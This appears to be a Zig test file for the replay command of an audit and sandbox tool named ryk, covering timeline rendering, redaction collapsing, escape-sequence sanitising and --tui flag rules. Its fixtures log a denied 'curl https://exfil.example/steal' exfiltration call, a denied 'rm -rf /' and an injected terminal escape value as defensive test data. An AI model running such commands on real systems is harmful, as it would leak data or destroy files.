fn writeReplayTimelineFixture(io: std.Io, allocator: std.mem.Allocator, workspace_root: []const u8) ![]u8 {
    const now = core.time.Timestamp.fromUnixSeconds(1_777_983_130);
    var session_id: core.session.SessionId = .{ .value = undefined, .len = 0 };
    const session_id_text = try std.fmt.bufPrint(&session_id.value, "replay-timeline-fixture", .{});
    session_id.len = session_id_text.len;
    const session = core.session.Session{
        .id = session_id,
        .started_at = now,
        .ended_at = now,
        .command = "ryk",
        .args = &.{ "run", "--", "echo", "ok" },
        .workspace_root = workspace_root,
        .session_name = "replay-timeline-test",
        .mode = .strict,
        .platform = core.platform.detectOs(),
    };
    var audit_writer = try core_api.createAuditWriter(io, allocator, session);
    defer audit_writer.deinit();

    for (0..3) |index| {
        var event_id: core.event.EventId = .{ .value = undefined, .len = 0 };
        const event_id_text = try std.fmt.bufPrint(&event_id.value, "redaction-{d}", .{index});
        event_id.len = event_id_text.len;
        const event = try core_api.createAuditEvent(.{
            .session_id = session.id,
            .event_id = event_id,
            .timestamp = now,
            .event_type = .secret_redacted,
            .actor = .{ .kind = .ryk, .display = "ryk" },
            .target = .{ .kind = .env_var, .value = "TOKEN\x1b[2J\nvalue" },
            .decision = null,
            .redactions = .{ .count = 1, .labels = &.{"TOKEN"} },
        });
        try core_api.appendAuditEvent(&audit_writer, event);
    }
    var allowed_id: core.event.EventId = .{ .value = undefined, .len = 0 };
    const allowed_id_text = try std.fmt.bufPrint(&allowed_id.value, "allowed", .{});
    allowed_id.len = allowed_id_text.len;
    const allowed = try core_api.createAuditEvent(.{
        .session_id = session.id,
        .event_id = allowed_id,
        .timestamp = now,
        .event_type = .command_allowed,
        .actor = .{ .kind = .ryk, .display = "ryk" },
        .target = .{ .kind = .command, .value = "echo ok" },
        .decision = core_api.makeDecision(.{ .result = .allow, .reason = "allowed" }),
    });
    try core_api.appendAuditEvent(&audit_writer, allowed);
    try audit_writer.writeLastPointer();
    try core_api.writeAuditSummary(allocator, audit_writer.sessionDirPath(), .{
        .session = session,
        .status = .{ .exited = 0 },
        .event_count = audit_writer.event_count,
        .final_event_hash = audit_writer.finalHash() orelse "",
        .policy = ".ryk/policy.yaml",
        .product_label = brand.product_display,
    });
    return allocator.dupe(u8, audit_writer.session_id.slice());
}

/// Session fixture with network_connect_denied only (no command_denied) for M-4 classifier.
fn writeReplayNetworkDenyFixture(io: std.Io, allocator: std.mem.Allocator, workspace_root: []const u8) ![]u8 {
    const now = core.time.Timestamp.fromUnixSeconds(1_777_983_130);
    var session_id: core.session.SessionId = .{ .value = undefined, .len = 0 };
    const session_id_text = try std.fmt.bufPrint(&session_id.value, "replay-network-deny-fixture", .{});
    session_id.len = session_id_text.len;
    const session = core.session.Session{
        .id = session_id,
        .started_at = now,
        .ended_at = now,
        .command = "ryk",
        .args = &.{ "run", "--", "curl", "https://exfil.example/steal" },
        .workspace_root = workspace_root,
        .session_name = "replay-network-deny-test",
        .mode = .strict,
        .platform = core.platform.detectOs(),
    };
    var audit_writer = try core_api.createAuditWriter(io, allocator, session);
    defer audit_writer.deinit();

    var allowed_id: core.event.EventId = .{ .value = undefined, .len = 0 };
    const allowed_id_text = try std.fmt.bufPrint(&allowed_id.value, "allowed", .{});
    allowed_id.len = allowed_id_text.len;
    const allowed = try core_api.createAuditEvent(.{
        .session_id = session.id,
        .event_id = allowed_id,
        .timestamp = now,
        .event_type = .command_allowed,
        .actor = .{ .kind = .ryk, .display = "ryk" },
        .target = .{ .kind = .command, .value = "curl https://exfil.example/steal" },
        .decision = core_api.makeDecision(.{ .result = .allow, .reason = "command allowed" }),
    });
    try core_api.appendAuditEvent(&audit_writer, allowed);

    var denied_id: core.event.EventId = .{ .value = undefined, .len = 0 };
    const denied_id_text = try std.fmt.bufPrint(&denied_id.value, "net-denied", .{});
    denied_id.len = denied_id_text.len;
    const denied = try core_api.createAuditEvent(.{
        .session_id = session.id,
        .event_id = denied_id,
        .timestamp = now,
        .event_type = .network_connect_denied,
        .actor = .{ .kind = .ryk, .display = "ryk" },
        .target = .{ .kind = .network_endpoint, .value = "https://exfil.example/steal" },
        .decision = core_api.makeDecision(.{ .result = .deny, .reason = "network blocked by policy" }),
    });
    try core_api.appendAuditEvent(&audit_writer, denied);

    try audit_writer.writeLastPointer();
    try core_api.writeAuditSummary(allocator, audit_writer.sessionDirPath(), .{
        .session = session,
        .status = .{ .exited = 1 },
        .event_count = audit_writer.event_count,
        .final_event_hash = audit_writer.finalHash() orelse "",
        .policy = ".ryk/policy.yaml",
        .product_label = brand.product_display,
    });
    return allocator.dupe(u8, audit_writer.session_id.slice());
}

/// Session fixture with one allowed and one denied command (for deny-emphasis tests).
fn writeReplayDenyFixture(io: std.Io, allocator: std.mem.Allocator, workspace_root: []const u8) ![]u8 {
    const now = core.time.Timestamp.fromUnixSeconds(1_777_983_130);
    var session_id: core.session.SessionId = .{ .value = undefined, .len = 0 };
    const session_id_text = try std.fmt.bufPrint(&session_id.value, "replay-deny-fixture", .{});
    session_id.len = session_id_text.len;
    const session = core.session.Session{
        .id = session_id,
        .started_at = now,
        .ended_at = now,
        .command = "ryk",
        .args = &.{ "run", "--", "echo", "ok" },
        .workspace_root = workspace_root,
        .session_name = "replay-deny-test",
        .mode = .strict,
        .platform = core.platform.detectOs(),
    };
    var audit_writer = try core_api.createAuditWriter(io, allocator, session);
    defer audit_writer.deinit();

    var allowed_id: core.event.EventId = .{ .value = undefined, .len = 0 };
    const allowed_id_text = try std.fmt.bufPrint(&allowed_id.value, "allowed", .{});
    allowed_id.len = allowed_id_text.len;
    const allowed = try core_api.createAuditEvent(.{
        .session_id = session.id,
        .event_id = allowed_id,
        .timestamp = now,
        .event_type = .command_allowed,
        .actor = .{ .kind = .ryk, .display = "ryk" },
        .target = .{ .kind = .command, .value = "echo ok" },
        .decision = core_api.makeDecision(.{ .result = .allow, .reason = "allowed" }),
    });
    try core_api.appendAuditEvent(&audit_writer, allowed);

    var denied_id: core.event.EventId = .{ .value = undefined, .len = 0 };
    const denied_id_text = try std.fmt.bufPrint(&denied_id.value, "denied", .{});
    denied_id.len = denied_id_text.len;
    const denied = try core_api.createAuditEvent(.{
        .session_id = session.id,
        .event_id = denied_id,
        .timestamp = now,
        .event_type = .command_denied,
        .actor = .{ .kind = .ryk, .display = "ryk" },
        .target = .{ .kind = .command, .value = "rm -rf /" },
        .decision = core_api.makeDecision(.{ .result = .deny, .reason = "blocked by policy" }),
    });
    try core_api.appendAuditEvent(&audit_writer, denied);

    try audit_writer.writeLastPointer();
    try core_api.writeAuditSummary(allocator, audit_writer.sessionDirPath(), .{
        .session = session,
        .status = .{ .exited = 1 },
        .event_count = audit_writer.event_count,
        .final_event_hash = audit_writer.finalHash() orelse "",
        .policy = ".ryk/policy.yaml",
        .product_label = brand.product_display,
    });
    return allocator.dupe(u8, audit_writer.session_id.slice());
}

test "replay human timeline collapses repeated redactions and json remains exact" {
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(root);
    try tmp.dir.createDirPath(std.testing.io, ".ryk");
    {
        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
        defer policy_file.close(std.testing.io);
        try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
    }
    const session_id = try writeReplayTimelineFixture(std.testing.io, std.testing.allocator, root);
    defer std.testing.allocator.free(session_id);

    const previous_cwd = try std.Io.Dir.cwd().realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(previous_cwd);
    try std.process.setCurrentDir(std.testing.io, tmp.dir);
    defer std.process.setCurrentPath(std.testing.io, previous_cwd) catch {};

    var human_stdout_buf: [4096]u8 = undefined;
    var human_stderr_buf: [512]u8 = undefined;
    var human_stdout: std.Io.Writer = .fixed(&human_stdout_buf);
    var human_stderr: std.Io.Writer = .fixed(&human_stderr_buf);
    const human_code = try command(std.testing.io, &.{ "--session", session_id }, &human_stdout, &human_stderr);

    try std.testing.expectEqual(exit_codes.success, human_code);
    try std.testing.expectEqualStrings("", human_stderr.buffered());
    try std.testing.expect(std.mem.indexOf(u8, human_stdout.buffered(), "3 secret redactions") != null);
    try std.testing.expectEqual(@as(usize, 1), std.mem.count(u8, human_stdout.buffered(), "secret_redacted"));
    try std.testing.expect(std.mem.indexOf(u8, human_stdout.buffered(), "├ ⚠") != null);
    try std.testing.expect(std.mem.indexOf(u8, human_stdout.buffered(), "└ ✓") != null);
    try std.testing.expect(std.mem.indexOf(u8, human_stdout.buffered(), "TOKEN value") != null);
    try std.testing.expect(std.mem.indexOf(u8, human_stdout.buffered(), "[2J") == null);
    try std.testing.expect(std.mem.indexOf(u8, human_stdout.buffered(), "\nvalue") == null);
    try std.testing.expect(std.mem.indexOfScalar(u8, human_stdout.buffered(), 0x1b) == null);

    var actual_json_buf: [8192]u8 = undefined;
    var json_stderr_buf: [512]u8 = undefined;
    var actual_json: std.Io.Writer = .fixed(&actual_json_buf);
    var json_stderr: std.Io.Writer = .fixed(&json_stderr_buf);
    const json_code = try command(std.testing.io, &.{ "--session", session_id, "--json" }, &actual_json, &json_stderr);

    try std.testing.expectEqual(exit_codes.success, json_code);
    const expected_json =
        \\[{"version":1,"session_id":"replay-timeline-fixture","event_id":"redaction-0","timestamp":"2026-05-05T12:12:10Z","type":"secret_redacted","actor":{"kind":"ryk","id":null,"display":"ryk"},"target":{"kind":"env_var","value":"TOKEN\u001b[2J\nvalue"},"decision":null,"redactions":{"count":1,"labels":["TOKEN"]},"previous_hash":null,"event_hash":"6e12aab094e89907622c2dd8edaf3e585b3eba40547ee2b6a9cac9d8fbac0b5a"},{"version":1,"session_id":"replay-timeline-fixture","event_id":"redaction-1","timestamp":"2026-05-05T12:12:10Z","type":"secret_redacted","actor":{"kind":"ryk","id":null,"display":"ryk"},"target":{"kind":"env_var","value":"TOKEN\u001b[2J\nvalue"},"decision":null,"redactions":{"count":1,"labels":["TOKEN"]},"previous_hash":"6e12aab094e89907622c2dd8edaf3e585b3eba40547ee2b6a9cac9d8fbac0b5a","event_hash":"3b316dccccabf41c1b9c12a67ecf533a46b18d00557b1f06c62f6907106bc9a3"},{"version":1,"session_id":"replay-timeline-fixture","event_id":"redaction-2","timestamp":"2026-05-05T12:12:10Z","type":"secret_redacted","actor":{"kind":"ryk","id":null,"display":"ryk"},"target":{"kind":"env_var","value":"TOKEN\u001b[2J\nvalue"},"decision":null,"redactions":{"count":1,"labels":["TOKEN"]},"previous_hash":"3b316dccccabf41c1b9c12a67ecf533a46b18d00557b1f06c62f6907106bc9a3","event_hash":"fc0f50fb4bd47f6ba2c88f2a2ed729f39ea299fafb3d15b19ecd06ebae39fdf7"},{"version":1,"session_id":"replay-timeline-fixture","event_id":"allowed","timestamp":"2026-05-05T12:12:10Z","type":"command_allowed","actor":{"kind":"ryk","id":null,"display":"ryk"},"target":{"kind":"command","value":"echo ok"},"decision":{"result":"allow","rule_id":null,"reason":"allowed","risk_score":null,"requires_user":false,"ci_may_proceed":false},"redactions":{"count":0,"labels":[]},"previous_hash":"fc0f50fb4bd47f6ba2c88f2a2ed729f39ea299fafb3d15b19ecd06ebae39fdf7","event_hash":"4841d6746c2b5ee5ffffdae0c0a6c2c9d94d013b08f0d4ae460f66d660872e75"}]
        \\
    ;
    try std.testing.expectEqualStrings(expected_json, actual_json.buffered());
    try std.testing.expectEqualStrings("", json_stderr.buffered());
}

// ---------------------------------------------------------------------------
// Phase 7 Task D: --tui alt-screen view (rejection contracts; the raw TTY loop
// is manual-verify per the prompt.zig:19 note). Linear + --json byte contracts
// must be unchanged when --tui is absent.
// ---------------------------------------------------------------------------

test "replay --tui is rejected on non-interactive output (no colour terminal)" {
    // Fixed-buffer stdout → theme.active() resolves to capability .none → the
    // alt-screen view must be rejected with a usage error, never entering the
    // alt-screen on a pipe/buffer (invariant: non-TTY → plain text).
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(root);
    try tmp.dir.createDirPath(std.testing.io, ".ryk");
    {
        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
        defer policy_file.close(std.testing.io);
        try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
    }
    const session_id = try writeReplayTimelineFixture(std.testing.io, std.testing.allocator, root);
    defer std.testing.allocator.free(session_id);

    const previous_cwd = try std.Io.Dir.cwd().realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(previous_cwd);
    try std.process.setCurrentDir(std.testing.io, tmp.dir);
    defer std.process.setCurrentPath(std.testing.io, previous_cwd) catch {};

    var stdout_buf: [4096]u8 = undefined;
    var stderr_buf: [512]u8 = undefined;
    var stdout_writer: std.Io.Writer = .fixed(&stdout_buf);
    var stderr_writer: std.Io.Writer = .fixed(&stderr_buf);

    const code = try command(std.testing.io, &.{ "--session", session_id, "--tui" }, &stdout_writer, &stderr_writer);
    try std.testing.expectEqual(exit_codes.usage, code);
    try std.testing.expect(std.mem.indexOf(u8, stderr_writer.buffered(), "--tui") != null);
    try std.testing.expect(std.mem.indexOf(u8, stderr_writer.buffered(), "interactive") != null);
    // No alt-screen controls leaked onto the buffer.
    try std.testing.expect(std.mem.indexOf(u8, stdout_writer.buffered(), "\x1b[?1049") == null);
}

test "replay --tui cannot combine with --json" {
    // Phase 7: --tui+--json is rejected at preflight (before session load), so a
    // missing session never masks the flag conflict. No workspace/session needed.
    var stdout_buf: [256]u8 = undefined;
    var stderr_buf: [256]u8 = undefined;
    var stdout_writer: std.Io.Writer = .fixed(&stdout_buf);
    var stderr_writer: std.Io.Writer = .fixed(&stderr_buf);

    const code = try command(std.testing.io, &.{ "--json", "--tui" }, &stdout_writer, &stderr_writer);
    try std.testing.expectEqual(exit_codes.usage, code);
    try std.testing.expect(std.mem.indexOf(u8, stderr_writer.buffered(), "--tui") != null);
    try std.testing.expect(std.mem.indexOf(u8, stderr_writer.buffered(), "--json") != null);
    try std.testing.expect(std.mem.indexOf(u8, stdout_writer.buffered(), "\x1b[?1049") == null);
}

test "replay linear timeline is unchanged when --tui is absent" {
    // Regression guard: the default (no --tui) human render must be byte-identical
    // to before the Phase 7 wiring (invariant #1: --json frozen; linear stable).
    var tmp = std.testing.tmpDir(.{});
    defer tmp.cleanup();
    const root = try tmp.dir.realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(root);
    try tmp.dir.createDirPath(std.testing.io, ".ryk");
    {
        const policy_file = try tmp.dir.createFile(std.testing.io, ".ryk/policy.yaml", .{});
        defer policy_file.close(std.testing.io);
        try policy_file.writeStreamingAll(std.testing.io, "version: 1\nmode: strict\n");
    }
    const session_id = try writeReplayTimelineFixture(std.testing.io, std.testing.allocator, root);
    defer std.testing.allocator.free(session_id);

    const previous_cwd = try std.Io.Dir.cwd().realPathFileAlloc(std.testing.io, ".", std.testing.allocator);
    defer std.testing.allocator.free(previous_cwd);
    try std.process.setCurrentDir(std.testing.io, tmp.dir);
    defer std.process.setCurrentPath(std.testing.io, previous_cwd) catch {};

    var stdout_buf: [4096]u8 = undefined;
    var stderr_buf: [512]u8 = undefined;
    var stdout_writer: std.Io.Writer = .fixed(&stdout_buf);
    var stderr_writer: std.Io.Writer = .fixed(&stderr_buf);

    const code = try command(std.testing.io, &.{ "--session", session_id }, &stdout_writer, &stderr_writer);
    try std.testing.expectEqual(exit_codes.success, code);
    // Same collapsed-redaction contract as the pre-Phase-7 timeline test.
    try std.testing.expect(std.mem.indexOf(u8, stdout_writer.buffered(), "3 secret redactions") != null);
    try std.testing.expectEqual(@as(usize, 1), std.mem.count(u8, stdout_writer.buffered(), "secret_redacted"));
    try std.testing.expect(std.mem.indexOf(u8, stdout_writer.buffered(), "├ ⚠") != null);
    try std.testing.expect(std.mem.indexOf(u8, stdout_writer.buffered(), "└ ✓") != null);
    try std.testing.expect(std.mem.indexOfScalar(u8, stdout_writer.buffered(), 0x1b) == null);
}
